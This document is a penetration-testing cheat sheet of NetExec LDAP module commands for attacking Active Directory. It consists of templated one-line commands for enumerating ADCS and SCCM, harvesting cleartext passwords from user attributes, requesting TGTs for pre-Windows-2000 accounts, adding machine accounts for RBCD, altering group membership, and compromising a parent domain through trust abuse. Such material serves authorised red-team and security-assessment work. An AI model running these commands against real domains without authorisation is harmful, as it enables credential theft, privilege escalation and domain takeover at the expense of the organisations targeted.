# NetExec LDAP Modules

## nxc ldap modules

### adcs

Find adcs with NetExec LDAP Modules.

Find PKI Enrollment Services in AD and list certificate template names. Cheap pre-flight before reaching for certipy.

```sh title:"NetExec LDAP Modules Find Adcs"
nxc ldap $domain -u $user $auth_flags -M adcs
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### badsuccessor

Check badsuccessor with NetExec LDAP Modules.

Check if the domain is vulnerable to the badSuccessor primitive (dMSA migration takeover).

```sh title:"NetExec LDAP Modules Check Badsuccessor"
nxc ldap $domain -u $user $auth_flags -M badsuccessor
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### certipy-find

Find certipy find with NetExec LDAP Modules.

Run certipy `find` from inside nxc with options to export results to text/csv/json. Defaults to vulnerable templates only.

```sh title:"NetExec LDAP Modules Find Certipy Find"
nxc ldap $domain -u $user $auth_flags -M certipy-find
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dns-nonsecure

Run DNS nonsecure with NetExec LDAP Modules.

Detect ADIDNS zones that allow nonsecure dynamic updates. Anyone authenticated can write records into a nonsecure zone.

```sh title:"NetExec LDAP Modules Run DNS Nonsecure"
nxc ldap $domain -u $user $auth_flags -M dns-nonsecure
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dump-computers

Dump computers with NetExec LDAP Modules.

Dump FQDN and OS for every computer in the domain. Quick OS inventory.

```sh title:"NetExec LDAP Modules Dump Computers"
nxc ldap $domain -u $user $auth_flags -M dump-computers
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### entra-id

Dump entra id with NetExec LDAP Modules.

Find the Entra ID sync server. High-value box because it holds the AD Connect MSOL credential.

```sh title:"NetExec LDAP Modules Dump Entra Id"
nxc ldap $domain -u $user $auth_flags -M entra-id
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### find-computer

Find computer with NetExec LDAP Modules.

Find computer objects matching a text fragment. Faster than crafting a custom LDAP query when you just want a name match.

```sh title:"NetExec LDAP Modules Find Computer"
nxc ldap $domain -u $user $auth_flags -M find-computer -o NAME=$search
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var search
-->

### get-scriptpath

Enumerate get scriptpath with NetExec LDAP Modules.

Pull the `scriptPath` attribute from every user. Logon scripts on SYSVOL sometimes contain creds or pointers to interesting shares.

```sh title:"NetExec LDAP Modules Enumerate Get Scriptpath"
nxc ldap $domain -u $user $auth_flags -M get-scriptpath
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### groupmembership

List groupmembership with NetExec LDAP Modules.

List groups a specific user belongs to.

```sh title:"NetExec LDAP Modules List Groupmembership"
nxc ldap $domain -u $user $auth_flags -M groupmembership -o USER=$target_user
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
-->

### obsolete

List obsolete with NetExec LDAP Modules.

Extract obsolete operating systems from LDAP. Out-of-support hosts are immediate vuln candidates.

```sh title:"NetExec LDAP Modules List Obsolete"
nxc ldap $domain -u $user $auth_flags -M obsolete
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### pso

Read pso with NetExec LDAP Modules.

Read Fine-Grained Password Policies (PSOs). Often laxer than the default policy on legacy/service accounts.

```sh title:"NetExec LDAP Modules Read Pso"
nxc ldap $domain -u $user $auth_flags -M pso
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### sccm

Find sccm with NetExec LDAP Modules.

Find SCCM infrastructure published in AD. Pivot point for credential extraction (NAA, OSD, PXE).

```sh title:"NetExec LDAP Modules Find Sccm"
nxc ldap $domain -u $user $auth_flags -M sccm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### subnets

Scan subnets with NetExec LDAP Modules.

Enumerate AD Sites and Subnets. Maps the network from AD's perspective without scanning.

```sh title:"NetExec LDAP Modules Scan Subnets"
nxc ldap $domain -u $user $auth_flags -M subnets
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### whoami

Read whoami with NetExec LDAP Modules.

Get details on the authenticated principal (group memberships, attributes).

```sh title:"NetExec LDAP Modules Read Whoami"
nxc ldap $domain -u $user $auth_flags -M whoami
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-desc-users

Scan get desc users with NetExec LDAP Modules.

Pull the `description` field from every user. Lazy admins sometimes drop passwords here.

```sh title:"NetExec LDAP Modules Scan Get Desc Users"
nxc ldap $domain -u $user $auth_flags -M get-desc-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-info-users

Scan get info users with NetExec LDAP Modules.

Pull the `info` (notes) field from every user. Same hunt as descriptions.

```sh title:"NetExec LDAP Modules Scan Get Info Users"
nxc ldap $domain -u $user $auth_flags -M get-info-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-unixUserPassword

Dump get unixUserPassword with NetExec LDAP Modules.

Dump `unixUserPassword` attribute from every user. Often overlooked legacy attribute holding cleartext.

```sh title:"NetExec LDAP Modules Dump Get UnixUserPassword"
nxc ldap $domain -u $user $auth_flags -M get-unixUserPassword
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-userPassword

Dump get userPassword with NetExec LDAP Modules.

Dump the `userPassword` attribute from every user. Rarely populated on Windows DCs but high payoff when it is.

```sh title:"NetExec LDAP Modules Dump Get UserPassword"
nxc ldap $domain -u $user $auth_flags -M get-userPassword
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### user-desc

Dump user desc with NetExec LDAP Modules.

Targeted scan of user descriptions for credential-shaped strings.

```sh title:"NetExec LDAP Modules Dump User Desc"
nxc ldap $domain -u $user $auth_flags -M user-desc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### add-computer

Create add computer with NetExec LDAP Modules.

Add (or delete) a domain computer via SAMR or LDAPS. Required for RBCD and Shadow Credentials when MachineAccountQuota > 0.

```sh title:"NetExec LDAP Modules Create Add Computer"
nxc ldap $domain -u $user $auth_flags -M add-computer -o NAME=$rhost_name PASSWORD=$target_pass
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var rhost_name
var target_pass
-->

### modify-group

Write modify group with NetExec LDAP Modules.

Modify group membership for users or computers via LDAP. Usable when you have GenericWrite/GenericAll on the group.

```sh title:"NetExec LDAP Modules Write Modify Group"
nxc ldap $domain -u $user $auth_flags -M modify-group -o GROUP=$group_name USER=$target_user ACTION=add
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var group_name
var target_user
-->

### pre2k

Dump pre2k with NetExec LDAP Modules.

Identify pre-Windows-2000-compatible computer accounts (default password = lowercase samaccountname) and request TGTs for each.

```sh title:"NetExec LDAP Modules Dump Pre2k"
nxc ldap $domain -u $user $auth_flags -M pre2k
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### raisechild (HIGH)

Run raisechild (HIGH) with NetExec LDAP Modules.

Compromise the parent domain from a child domain via inter-realm trust abuse. Requires DA in the child.

```sh title:"NetExec LDAP Modules Run Raisechild (HIGH)"
nxc ldap $domain -u $user $auth_flags -M raisechild
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

